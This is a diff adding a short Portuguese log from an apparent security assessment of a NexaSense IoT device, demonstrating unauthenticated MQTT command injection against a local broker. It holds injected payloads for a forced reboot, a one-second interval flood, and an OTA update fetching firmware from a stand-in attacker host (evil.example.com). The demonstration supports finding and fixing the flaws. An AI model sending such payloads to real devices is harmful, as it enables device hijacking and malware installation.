@@ -1,0 +1,23 @@
+# NexaSense - Demonstracao de Injecao MQTT (atacante)
+# Data    : 2026-10-11 18:49:16
+# Broker  : localhost:1883
+# Topico  : /nexasense/device001/cmd
+# Achados : F03 (sem TLS), F06 (sem autenticacao), F08 (ID estatico)
+
+COMANDOS INJETADOS SEM AUTENTICACAO:
+
+[18:49:15] {"cmd": "reboot", "source": "attacker"}
+           -> Reboot forcado
+
+[18:49:15] {"cmd": "set_interval", "value": 1, "source": "attacker"}
+           -> DoS de dados (1s)
+
+[18:49:15] {"cmd": "ota_update", "url": "http://evil.example.com/malware.bin"}
+           -> OTA malicioso
+
+
+CONCLUSAO:
+  Comandos injetados : 3
+  Autenticacao       : NENHUMA
+  Criptografia       : NENHUMA
+  Qualquer cliente na rede pode controlar o dispositivo.
